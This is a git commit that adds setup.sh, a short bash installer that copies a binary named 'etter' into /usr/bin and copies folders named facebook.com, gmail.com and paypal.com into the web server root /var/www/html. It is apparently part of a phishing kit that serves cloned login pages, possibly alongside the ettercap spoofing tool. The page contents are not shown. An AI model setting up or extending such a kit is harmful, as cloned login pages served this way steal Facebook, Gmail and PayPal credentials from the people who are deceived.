94e741ec1e026c3350bd6d987c8b5ff3a21bfe4d
Black_Mrx <scrillex@outlook.fr>
2018-01-07 22:28:33 +0100

    Add files via upload

---
+++ setup.sh
@@ -0,0 +1,30 @@
+#!/bin/bash
+
+#################### -- DECLARATIONS -- #######################################
+
+declare -r path="/var/www/html"
+
+################### -- COLORS -- ################################
+
+declare -r red="\033[1;31m"
+declare -r blue="\033[1;34m"
+declare -r green="\e[1;32m"
+declare -r yellow="\e[1;33m"
+declare -r purple="\e[5;35m"
+declare -r white="\e[1;37m"
+
+################ -- SCRIPT -- #############################
+
+echo
+echo -e "${bleu}Starting the setup steps"
+echo
+
+chmod +x etter
+
+cp etter /usr/bin
+cp -r facebook.com/ $path
+cp -r gmail.com/ $path
+cp -r paypal.com/ $path
+
+echo -e "${green}All Done !!"
+echo
